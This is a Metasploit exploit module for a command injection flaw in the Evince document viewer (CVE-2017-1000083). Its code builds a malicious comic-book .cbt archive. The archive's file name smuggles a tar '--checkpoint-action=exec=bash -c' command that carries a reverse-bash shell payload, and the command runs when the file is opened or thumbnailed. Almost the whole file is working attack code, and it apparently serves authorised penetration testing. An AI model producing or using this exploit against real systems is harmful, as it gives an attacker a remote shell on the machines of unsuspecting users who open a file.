# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;rex/zip&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Evince CBT File Command Injection&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a command injection vulnerability in Evince
        before version 3.24.1 when opening comic book `.cbt` files.

        Some file manager software, such as Nautilus and Atril, may allow
        automatic exploitation without user interaction due to thumbnailer

        Note that limited space is available for the payload (<256 bytes).
        Reverse Bash and Reverse Netcat payloads should be sufficiently small.

        This module has been tested successfully on evince versions:

        3.4.0-3.1 + nautilus 3.4.2-1+build1 on Kali 1.0.6;
        3.18.2-1ubuntu4.3 + atril 1.12.2-1ubuntu0.3 on Ubuntu 16.04.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Felix Wilhelm&#039;,     # Discovery
          &#039;Sebastian Krahmer&#039;, # PoC
          &#039;Matlink&#039;,           # Exploit
          &#039;bcoles&#039;             # Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;BID&#039;, &#039;99597&#039;],
          [&#039;CVE&#039;, &#039;2017-1000083&#039;],
          [&#039;EDB&#039;, &#039;45824&#039;],
          [&#039;URL&#039;, &#039;https://seclists.org/oss-sec/2017/q3/128&#039;],
          [&#039;URL&#039;, &#039;https://bugzilla.gnome.org/show_bug.cgi?id=784630&#039;],
          [&#039;URL&#039;, &#039;https://bugzilla.suse.com/show_bug.cgi?id=1046856&#039;],
          [&#039;URL&#039;, &#039;https://bugs.launchpad.net/ubuntu/+source/atril/+bug/1735418&#039;],
          [&#039;URL&#039;, &#039;https://bugs.launchpad.net/ubuntu/+source/atril/+bug/1800662&#039;],
          [&#039;URL&#039;, &#039;https://access.redhat.com/security/cve/cve-2017-1000083&#039;],
          [&#039;URL&#039;, &#039;https://security-tracker.debian.org/tracker/CVE-2017-1000083&#039;]
        ],
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 215,
          &#039;BadChars&#039;    => "\x00\x0a\x0d\x22",
          &#039;DisableNops&#039; => true
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_bash&#039;,
          &#039;DisablePayloadHandler&#039; => true
        },
      &#039;Targets&#039;        => [[ &#039;Automatic&#039;, {}]],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;2017-07-13&#039;,
      &#039;DefaultTarget&#039;  => 0))
    register_options([
      OptString.new(&#039;FILENAME&#039;, [true, &#039;The cbt document file name&#039;, &#039;msf.cbt&#039;])
    ])
  end

  def exploit
    ext = %w[png jpg gif]
    path = " --checkpoint-action=exec=bash -c \"#{payload.encoded};\".#{ext.sample}"

    # Tar archive max path length is 256.
    if path.length > 256
      fail_with Failure::PayloadFailed, "Payload is too large (#{path.length}): Max path length is 256 characters"
    end

    # Tar archive max file name length is 100.
    path.split(&#039;/&#039;).each do |fname|
      if fname.length > 100
        fail_with Failure::PayloadFailed, "File name too long (#{fname.length}): Max filename length is 100 characters"
      end
    end

    # Create malicious tar archive
    tarfile = StringIO.new
    Rex::Tar::Writer.new tarfile do |tar|
      tar.add_file path, 0644 do |io|
        io.write &#039;&#039;
      end
      # Pad file to 1+ MB to trigger tar checkpoint action
      tar.add_file rand_text_alphanumeric(10..20), 0644 do |io|
        io.write rand_text(1_000_000..1_100_000)
      end
    end
    tarfile.rewind
    cbt = tarfile.read

    print_status "Writing file: #{datastore[&#039;FILENAME&#039;]} (#{cbt.length} bytes) ..."
    file_create cbt
  end
end

